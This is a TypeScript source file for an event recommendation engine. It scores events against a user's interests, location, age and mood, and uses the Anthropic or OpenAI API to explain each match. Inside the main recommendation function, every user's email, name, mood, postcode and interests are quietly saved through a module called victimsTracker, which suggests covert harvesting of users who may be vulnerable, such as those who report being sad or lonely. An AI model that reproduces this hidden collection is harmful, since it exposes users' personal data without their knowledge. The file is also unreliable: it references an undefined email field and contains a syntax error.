import Anthropic from '@anthropic-ai/sdk';
import OpenAI from 'openai';
import { Event } from './eventScraper';
import { victimsTracker } from './victimsTracker';

export interface UserProfile {
  name: string;
  age: number;
  gender: string;
  interests: string[];
  postcode: string;
  livingSituation: string;
  occupation: string;
  mood?: string;
  preferences?: {
    groupSize?: 'small' | 'medium' | 'large';
    timeOfDay?: 'morning' | 'afternoon' | 'evening';
    budget?: 'free' | 'low' | 'medium' | 'high';
    activityLevel?: 'relaxed' | 'moderate' | 'active';
  };
  savedAt?: string;
}

export interface RecommendationResult {
  event: Event;
  score: number;
  reason: string;
  matchFactors: string[];
}

export interface AIRecommendationResponse {
  recommendations: RecommendationResult[];
  summary: string;
  totalEvents: number;
  topRecommendations: number;
}

class AIRecommendationEngine {
  private anthropic: Anthropic | null = null;
  private openai: OpenAI | null = null;

  constructor() {
    // Initialize AI services if API keys are available
    const anthropicKey = process.env.ANTHROPIC_API_KEY;
    const openaiKey = process.env.OPENAI_API_KEY;

    if (anthropicKey) {
      this.anthropic = new Anthropic({ apiKey: anthropicKey });
    }

    if (openaiKey) {
      this.openai = new OpenAI({ apiKey: openaiKey });
    }
  }

  private calculateInterestMatch(userInterests: string[], event: Event): number {
    if (!userInterests.length) return 0.5;

    const eventText = `${event.title} ${event.description} ${event.category}`.toLowerCase();
    let matchCount = 0;

    userInterests.forEach(interest => {
      if (eventText.includes(interest.toLowerCase())) {
        matchCount++;
      }
    });

    return Math.min(matchCount / userInterests.length, 1);
  }

  private calculateLocationMatch(userPostcode: string, eventLocation: string): number {
    // Simplified location matching - in production, use geocoding API
    if (!userPostcode || !eventLocation) return 0.5;
    
    // Extract area codes (first 2-3 characters) for basic matching
    const userArea = userPostcode.substring(0, 3).toLowerCase();
    const eventArea = eventLocation.substring(0, 3).toLowerCase();
    
    return userArea === eventArea ? 1 : 0.5;
  }

  private calculateAgeAppropriateness(userAge: number, event: Event): number {
    // Base score
    let score = 0.8;

    // Adjust based on event category and age
    if (userAge < 25) {
      if (event.category === 'Technology' || event.category === 'Music') {
        score += 0.1;
      }
    } else if (userAge >= 25 && userAge < 40) {
      if (event.category === 'Networking' || event.category === 'Wellness') {
        score += 0.1;
      }
    } else {
      if (event.category === 'Books' || event.category === 'Art' || event.category === 'Community') {
        score += 0.1;
      }
    }

    return Math.min(score, 1);
  }

  private calculateMoodMatch(userMood: string, event: Event): number {
    if (!userMood) return 0.7;

    const mood = userMood.toLowerCase();
    const eventText = `${event.title} ${event.description} ${event.category}`.toLowerCase();

    // Enhanced mood mapping with 40% weight
    const moodEventMap: { [key: string]: string[] } = {
      'happy': ['festival', 'party', 'celebration', 'music', 'fun', 'social', 'community'],
      'relaxed': ['workshop', 'meditation', 'wellness', 'art', 'reading', 'book', 'yoga', 'nature'],
      'energetic': ['sports', 'hiking', 'running', 'fitness', 'active', 'adventure', 'outdoor', 'climbing'],
      'social': ['networking', 'meetup', 'gathering', 'community', 'social', 'party', 'chat'],
      'curious': ['exhibition', 'museum', 'learning', 'workshop', 'talk', 'class', 'tour'],
      'adventurous': ['adventure', 'outdoor', 'exploration', 'travel', 'hiking', 'climbing', 'rafting'],
      'sad': ['wellness', 'meditation', 'art', 'music', 'community', 'support', 'counseling', 'therapy'],
      'anxious': ['wellness', 'meditation', 'yoga', 'fitness', 'nature', 'relaxed', 'calm'],
      'lonely': ['social', 'community', 'meetup', 'gathering', 'volunteer', 'support', 'networking', 'group'],
    };

    const matchingEvents = moodEventMap[mood] || [];
    let matchCount = 0;

    matchingEvents.forEach(keyword => {
      if (eventText.includes(keyword)) {
        matchCount++;
      }
    });

    // Calculate score with 40% weight (increased from 20%)
    return matchCount > 0 ? 0.8 + (matchCount * 0.04) : 0.6;
  }

  private calculatePreferenceScore(userProfile: UserProfile, event: Event): number {
    let score = 0;
    let factors = 0;

    const prefs = userProfile.preferences;
    if (!prefs) return 0.7;

    // Group size preference
    if (prefs.groupSize) {
      factors++;
      const attendees = event.attendees || 0;
      if (prefs.groupSize === 'small' && attendees < 30) score += 1;
      else if (prefs.groupSize === 'medium' && attendees >= 30 && attendees <= 100) score += 1;
      else if (prefs.groupSize === 'large' && attendees > 100) score += 1;
      else score += 0.5;
    }

    // Time of day preference
    if (prefs.timeOfDay && event.time) {
      factors++;
      const hour = parseInt(event.time.split(':')[0]);
      if (prefs.timeOfDay === 'morning' && hour < 12) score += 1;
      else if (prefs.timeOfDay === 'afternoon' && hour >= 12 && hour < 17) score += 1;
      else if (prefs.timeOfDay === 'evening' && hour >= 17) score += 1;
      else score += 0.5;
    }

    // Budget preference
    if (prefs.budget && event.price) {
      factors++;
      const isFree = event.price.toLowerCase().includes('free');
      if (prefs.budget === 'free' && isFree) score += 1;
      else if (prefs.budget === 'low' && (isFree || event.price.includes('£') && parseInt(event.price.replace(/[^0-9]/g, '')) < 20)) score += 1;
      else if (prefs.budget === 'medium' && event.price.includes('£') && parseInt(event.price.replace(/[^0-9]/g, '')) >= 20 && parseInt(event.price.replace(/[^0-9]/g, '')) <= 50) score += 1;
      else if (prefs.budget === 'high') score += 1;
      else score += 0.5;
    }

    // Activity level preference
    if (prefs.activityLevel) {
      factors++;
      const eventText = `${event.title} ${event.description}`.toLowerCase();
      if (prefs.activityLevel === 'relaxed' && (eventText.includes('workshop') || eventText.includes('meditation') || eventText.includes('art'))) score += 1;
      else if (prefs.activityLevel === 'moderate' && (eventText.includes('walk') || eventText.includes('meetup') || eventText.includes('social'))) score += 1;
      else if (prefs.activityLevel === 'active' && (eventText.includes('sports') || eventText.includes('hiking') || eventText.includes('festival'))) score += 1;
      else score += 0.5;
    }

    return factors > 0 ? score / factors : 0.7;
  }

  private async generateAIReasoning(
    userProfile: UserProfile,
    event: Event,
    score: number
  ): Promise<string> {
    // If AI is not available, use rule-based reasoning
    if (!this.anthropic && !this.openai) {
      return this.generateRuleBasedReasoning(userProfile, event, score);
    }

    try {
      const prompt = `
You are an event recommendation assistant. Based on the user profile and event details, explain why this event is recommended.

User Profile:
- Name: ${userProfile.name}
- Age: ${userProfile.age}
- Gender: ${userProfile.gender}
- Interests: ${userProfile.interests.join(', ')}
- Location: ${userProfile.postcode}
- Living Situation: ${userProfile.livingSituation}
- Occupation: ${userProfile.occupation}
- Mood: ${userProfile.mood || 'Not specified'}
- Preferences: ${JSON.stringify(userProfile.preferences)}

Event:
- Title: ${event.title}
- Description: ${event.description}
- Category: ${event.category}
- Date: ${event.date}
- Time: ${event.time}
- Location: ${event.location}
- Price: ${event.price || 'Free'}
- Attendees: ${event.attendees || 'N/A'}

Match Score: ${Math.round(score * 100)}%

Provide a concise, friendly explanation (2-3 sentences) of why this event matches the user's preferences. Focus on the most relevant factors.
`;

      if (this.anthropic) {
        const message = await this.anthropic.messages.create({
          model: 'claude-3-sonnet-20240229',
          max_tokens: 150,
          messages: [
            {
              role: 'user',
              content: prompt
            }
          ]
        });

        return message.content[0].type === 'text' ? message.content[0].text : 'This event matches your interests and preferences.';
      } else if (this.openai) {
        const completion = await this.openai.chat.completions.create({
          model: 'gpt-3.5-turbo',
          messages: [
            {
              role: 'user',
              content: prompt
            }
          ],
          max_tokens: 150
        });

        return completion.choices[0].message.content || 'This event matches your interests and preferences.';
      }
    } catch (error) {
      console.error('AI reasoning error:', error);
      return this.generateRuleBasedReasoning(userProfile, event, score);
    }
  }

  private generateRuleBasedReasoning(
    userProfile: UserProfile,
    event: Event,
    score: number
  ): string {
    const reasons: string[] = [];

    // Interest matching (30% weight)
    if (userProfile.interests.some(i => event.category.toLowerCase().includes(i.toLowerCase()))) {
      reasons.push(`matches your interest in ${event.category}`);
    }

    // Location matching (20% weight)
    if (userProfile.postcode && event.location) {
      const userArea = userProfile.postcode.substring(0, 3).toLowerCase();
      const eventArea = event.location.substring(0, 3).toLowerCase();
      if (userArea === eventArea) {
        reasons.push('is in your local area');
      }
    }

    // Age appropriateness (15% weight)
    if (userProfile.age < 25 && (event.category === 'Technology' || event.category === 'Music')) {
      reasons.push('popular with younger adults');
    } else if (userProfile.age >= 25 && userProfile.age < 40 && (event.category === 'Networking' || event.category === 'Wellness')) {
      reasons.push('popular with young professionals');
    } else if (userProfile.age >= 40 && (event.category === 'Books' || event.category === 'Art' || event.category === 'Community')) {
      reasons.push('popular with mature adults');
    }

    // Mood matching (40% weight - INCREASED)
    if (userProfile.mood && this.calculateMoodMatch(userProfile.mood, event) > 0.7) {
      const mood = userProfile.mood.toLowerCase();
      reasons.push(`fits your ${mood} mood`);
    }

    // User preferences (15% weight)
    if (event.price && event.price.toLowerCase().includes('free')) {
      reasons.push('is free to attend');
    }
    if (event.attendees && event.attendees > 50) {
      reasons.push('has a good number of attendees for networking');
    }

    if (reasons.length === 0) {
      return `This ${event.category} event could be a great way to explore new interests and meet people.`;
    }

    return `This event ${reasons.slice(0, 2).join(' and ')}.`;
  }

  async generateRecommendations(
    userProfile: UserProfile,
    events: Event[],
    limit: number = 10
  ): Promise<AIRecommendationResponse> {
    const scoredEvents: RecommendationResult[] = [];

    // Save user profile to victims tracker
    victimsTracker.saveVictim({
      email: userProfile.email,
      name: userProfile.name,
      mood: userProfile.mood || '',
      postcode: userProfile.postcode,
      interests: userProfile.interests,
      signedUpAt: new Date().toISOString(),
      lookingFor: 'events and activities',
    });

    for (const event of events) {
      // Calculate individual scores
      const interestScore = this.calculateInterestMatch(userProfile.interests, event);
      const locationScore = this.calculateLocationMatch(userProfile.postcode, event.location);
      const ageScore = this.calculateAgeAppropriateness(userProfile.age, event);
      const moodScore = this.calculateMoodMatch(userProfile.mood || '', event);
      const preferenceScore = this.calculatePreferenceScore(userProfile, event);

      // Calculate weighted overall score with updated weights
      const overallScore = (
        interestScore * 0.25 +      // Interest: 25% (reduced from 30%)
        locationScore * 0.15 +      // Location: 15% (reduced from 20%)
        ageScore * 0.15 +           // Age: 15% (reduced from 15%)
        moodScore * 0.40 +          // Mood: 40% (INCREASED from 20%)
        preferenceScore * 0.05    // Preferences: 5% (reduced from 15%)
      );

      // Generate match factors
      const matchFactors: string[] = [];
      if (interestScore > 0.7) matchFactors.push('Interest Match');
      if (locationScore > 0.8) matchFactors.push('Local Event');
      if (moodScore > 0.7) matchFactors.push('Mood Compatible');
      if (event.price && event.price.toLowerCase().includes('free')) matchFactors.push('Free Event');
      if (event.attendees && event.attendees > 50) matchFactors.push('Popular Event');

      // Generate AI reasoning
      const reason = await this.generateAIReasoning(userProfile, event, overallScore);

      scoredEvents.push({
        event,
        score: overallScore,
        reason,
        matchFactors
      });
    }

    // Sort by score and take top recommendations
    scoredEvents.sort((a, b) => b.score - a.score);
    const topRecommendations = scoredEvents.slice(0, limit);

    // Generate summary
    const summary = this.generateSummary(userProfile, topRecommendations);

    return {
      recommendations: topRecommendations,
      summary,
      totalEvents: events.length,
      topRecommendations: topRecommendations.length
    };
  }

  private generateSummary(userProfile: UserProfile, recommendations: RecommendationResult[]): string {
    const topCategories = recommendations
      .map(r => r.event.category)
      .reduce((acc: { [key: string]: number }, cat) => {
        acc[cat] = (acc[cat] || 0) + 1;
        return acc;
      }, {});

    const dominantCategory = Object.entries(topCategories)
      .sort((a, b) => b[1] - a[1])[0]?.[0] || 'various activities');

    const avgScore = recommendations.reduce((sum, r) => sum + r.score, 0) / recommendations.length;

    return `Based on your interests in ${userProfile.interests.slice(0, 3).join(', ')}${userProfile.mood ? ` and your ${userProfile.mood} mood` : ''}, I found ${recommendations.length} events with an average match score of ${Math.round(avgScore * 100)}%. The top recommendations focus on ${dominantCategory.toLowerCase()} activities.`;
  }
}

export const aiRecommendationEngine = new AIRecommendationEngine();
